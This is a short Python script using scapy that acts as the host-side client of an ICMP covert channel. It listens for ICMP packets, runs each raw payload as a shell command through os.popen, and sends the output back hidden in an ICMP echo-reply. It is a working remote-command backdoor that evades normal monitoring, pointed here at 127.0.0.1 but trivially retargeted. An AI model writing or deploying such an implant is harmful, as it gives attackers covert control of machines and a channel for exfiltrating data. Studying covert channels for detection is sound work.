#!/usr/bin/env python3

# Client should be on the host machine

from scapy.all import *

server = "127.0.0.1"

def send_cmd(cmd):
	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/cmd
	send(packet)
	print("done")

recv = sniff(filter="host 127.0.0.1 and icmp", count=1, iface="lo")
print(recv)
data = recv[0][Raw].load.decode('utf-8')
out = os.popen(data).read()

send_cmd(out)